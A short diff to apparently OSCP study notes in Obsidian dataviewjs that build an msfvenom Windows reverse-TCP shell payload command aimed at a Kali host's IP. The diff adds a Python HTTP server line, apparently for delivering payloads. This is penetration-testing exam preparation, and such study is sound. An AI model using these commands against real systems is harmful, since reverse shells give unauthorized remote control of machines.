@@ -31,6 +31,9 @@ const command = `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=${Ka
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+```
+python -m http.server 80
+```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
